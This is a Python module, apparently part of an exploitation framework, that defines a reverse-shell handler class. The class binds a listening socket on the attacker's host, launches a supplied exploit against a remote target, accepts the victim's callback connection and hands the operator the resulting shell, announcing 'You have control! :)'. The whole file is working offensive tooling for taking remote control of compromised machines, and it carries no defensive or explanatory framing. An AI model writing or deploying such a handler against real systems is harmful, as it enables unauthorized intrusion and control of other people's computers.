import socket
import typing

from pytoolcore import style
from core import exploitcore, shellcore


class BasicReverseShell(shellcore.AsynchronousBasicRemoteShell):

    SHELLREF: str = "BasicReverseShell"

    def __init__(self, exploit: exploitcore.Exploit, rhost, rport, lhost, lport)->None:
        if rhost and rport and lhost and lport:
            shellcore.AsynchronousBasicRemoteShell.__init__(self, exploit=exploit,
                                                            rhost=rhost, rport=rport,
                                                            lhost=lhost, lport=lport)
        else:
            raise ValueError("Missing or incorrect parameters")

    def configure(self)->None:

        lskt = socket.socket(self.protocol, socket.SOCK_STREAM)
        lskt.bind(self.lsockaddr)
        lskt.listen(1)

        self.exploit.run(self.rsockaddr)

        print(style.Style.info("Waiting for incoming connection..."))
        skt, addr = lskt.accept()
        self.shellskt = skt
        lskt.close()
        print(style.Style.success("You have control! :)"))


blueprint: typing.Callable = BasicReverseShell
name: str = BasicReverseShell.SHELLREF
